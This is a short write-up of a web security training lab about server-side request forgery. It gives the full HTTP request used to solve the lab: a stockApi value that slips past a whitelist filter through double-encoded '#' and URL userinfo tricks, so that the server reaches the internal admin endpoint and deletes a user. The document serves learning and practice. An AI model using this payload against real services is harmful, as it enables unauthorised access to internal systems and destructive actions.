# Lab: SSRF with whitelist-based input filter

>LAB DESC
```
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed an anti-SSRF defense you will need to bypass.
```
> SOLUTION

## SCRIPT
```
POST /product/stock HTTP/2
Host: 0abc0091033892fb80589990001500b5.web-security-academy.net
Cookie: session=d2AKgqe7UOrqYZWalnkVuZCPU2YAfRGc
Content-Length: 85
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: */*
Origin: https://0abc0091033892fb80589990001500b5.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0abc0091033892fb80589990001500b5.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```


Append a # to the username and observe that the URL is now rejected.
Double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".

### NOTE:-
The fragment `#` is discarded after URL parsing and only the localhost loopback reqeust is sent over to the server to continue the SSRF attack.
> LAB SOLVED
